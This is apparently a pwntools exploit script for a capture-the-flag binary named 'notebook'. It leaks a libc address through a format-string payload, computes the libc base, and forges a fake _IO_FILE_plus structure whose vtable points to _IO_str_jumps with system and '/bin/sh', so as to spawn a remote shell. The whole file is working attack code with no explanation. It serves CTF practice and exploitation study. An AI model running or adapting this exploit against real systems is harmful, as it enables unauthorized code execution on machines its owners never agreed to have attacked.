import pwn
from os import getenv

binary = pwn.ELF("./../chall/notebook", checksec=False)
ld = pwn.ELF("./../chall/ld-2.27.so", checksec=False) 
libc = pwn.ELF("./../chall/libc-2.27.so", checksec=False)

LIBC_OFFSET = 0x3b07e3

io = pwn.remote(getenv("IP"), int(getenv("PORT")))


def pad(payload, size):
    return payload + b'\x00' * (size - len(payload))


def postThread(payload):
    io.sendline(b'1')
    io.sendlineafter(b'> ', payload)
    io.recvuntil(b'> ')


def readThread():
    io.sendline(b'2')
    io.recvuntil(b'> ')
    io.recvline()
    return io.recvline(b'> ')


def Exit():
    io.sendline(b'3')
    io.interactive()

# send payload for leak


leakPayload = b'%p|' * 30
postThread(leakPayload)


# leak libc base
libc_leak = readThread().split(b'|')[0]
libc_leak = int(libc_leak.decode(), 16)

libc.address = libc_leak - LIBC_OFFSET
pwn.log.success(f"LIBC_BASE: {hex(libc.address)}")

print(hex(libc.symbols['_IO_str_jumps'] - libc.address))
print(hex(libc.symbols['system'] - libc.address))
print(hex(next(libc.search(b'/bin/sh')) - libc.address))


# craft fake _IO_FILE_plus structure
fakeFile = b''
fakeFile = pad(fakeFile, 0x38)
fakeFile += pwn.p64(next(libc.search(b'/bin/sh'))) # _IO_buf_base

fakeFile = pad(fakeFile, 0x88)
fakeFile += pwn.p64(0x404070) # _lock

fakeFile = pad(fakeFile, 0xd8)
fakeFile += pwn.p64(libc.symbols['_IO_str_jumps']) # _vtable

fakeFile = pad(fakeFile, 0xe8)
fakeFile += pwn.p64(libc.symbols['system'])

payload = pwn.p64(binary.symbols['notebook'] + 8)
payload += fakeFile

postThread(payload)
io.interactive()
#Exit()
